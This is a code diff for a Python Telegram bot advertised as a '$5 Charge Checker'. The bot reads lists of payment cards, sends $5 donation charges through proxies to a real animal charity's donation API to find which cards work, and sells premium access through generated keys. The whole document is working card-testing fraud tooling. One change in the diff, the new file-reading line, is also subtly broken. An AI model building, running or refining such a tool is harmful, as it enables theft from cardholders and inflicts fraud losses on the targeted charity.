@@ -22,7 +22,7 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
-# ================== KEY SYSTEM ==================
+# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -30,7 +30,8 @@ async def load_json(filename):
                 await f.write(json.dumps({}))
             return {}
         async with aiofiles.open(filename, "r") as f:
-            return json.loads((await f.read()).strip() or "{}")
+            content = await f.read().strip()
+            return json.loads(content) if content else {}
     except:
         return {}
 
@@ -40,15 +41,21 @@ async def save_json(filename, data):
 
 async def is_premium(user_id):
     data = await load_json(PREMIUM_FILE)
-    uid = str(user_id)
-    if uid not in data: return False
+    uid = str(user_id)  # Fixed: Convert to string
+    if uid not in data:
+        return False
     try:
         expiry = datetime.fromisoformat(data[uid]['expiry'])
         return datetime.now() <= expiry
     except:
         return False
 
-async def generate_key(days=30):
+async def is_banned(user_id):
+    data = await load_json(BANNED_FILE)
+    return str(user_id) in data
+
+# ================== KEY SYSTEM ==================
+async def generate_key(days: int = 30):
     import secrets
     key = "GIVEWP-" + secrets.token_hex(8).upper()
     data = await load_json(KEYS_FILE)
@@ -56,7 +63,7 @@ async def generate_key(days=30):
     await save_json(KEYS_FILE, data)
     return key
 
-async def redeem_key(user_id, key):
+async def redeem_key(user_id, key: str):
     data = await load_json(KEYS_FILE)
     premium = await load_json(PREMIUM_FILE)
     uid = str(user_id)
@@ -69,9 +76,9 @@ async def redeem_key(user_id, key):
     data[key]["used"] = True
     await save_json(KEYS_FILE, data)
     await save_json(PREMIUM_FILE, premium)
-    return f"✅ Success! Premium activated for {days} days."
+    return f"✅ Premium activated for {days} days!"
 
-# ================== CHECKER ==================
+# ================== REAL CHARGE FUNCTION ==================
 async def charge_5_dollars(card: str):
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
@@ -90,17 +97,25 @@ async def charge_5_dollars(card: str):
         }
 
         async with aiohttp.ClientSession() as session:
-            async with session.post("https://weanimals.donorsupport.co/api/donate", json=payload, proxy=proxy_url, timeout=30) as r:
+            async with session.post(
+                "https://weanimals.donorsupport.co/api/donate",
+                json=payload,
+                proxy=proxy_url,
+                timeout=30
+            ) as r:
                 text = await r.text()
+                print(f"[{current_time}] RESPONSE: {r.status} | {text[:200]}")
+
                 if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged"]):
                     return {"status": "Approved", "response": "Card Added (succeeded)"}
                 else:
                     return {"status": "Declined", "response": "Declined"}
+
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"ERROR: {e}")
         return {"status": "Declined", "response": "Error"}
 
-# ================== BEAUTIFUL APPROVED UI ==================
+# ================== BEAUTIFUL UI ==================
 async def send_approved(event, card, info):
     msg = f"""
 **Approved ✅**
@@ -119,17 +134,17 @@ async def send_approved(event, card, info):
 """
     await event.reply(msg)
 
-# ================== BOT ==================
+# ================== START UI ==================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
 async def start(event):
     if not await is_premium(event.sender_id):
-        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate premium.")
+        return await event.reply("**❌ No Access**\n\nSend `/key YOURKEY` to activate.")
     await event.reply(
         "**🔥 WeAnimals Media $5 Charge Checker**\n\n"
-        "• Send `.txt` file with cards\n"
-        "• Real GiveWP + Stripe\n"
-        "• Proxy Protected\n\n"
-        "Owner: /genkey <days>"
+        "Send `.txt` file with cards\n"
+        "Real GiveWP + Stripe\n"
+        "Proxy Protected\n\n"
+        "Owner: `/genkey <days>`"
     )
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
@@ -138,13 +153,13 @@ async def genkey(event):
         return await event.reply("Owner only!")
     days = int(event.pattern_match.group(1) or 30)
     key = await generate_key(days)
-    await event.reply(f"✅ New Key:\n`{key}`\nValid for {days} days")
+    await event.reply(f"✅ New Key:\n`{key}`")
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
 async def redeem(event):
     key = event.pattern_match.group(1)
     if not key:
-        return await event.reply("Usage: `/key YOURKEY`")
+        return await event.reply("Usage: `/key KEY`")
     msg = await redeem_key(event.sender_id, key)
     await event.reply(msg)
 
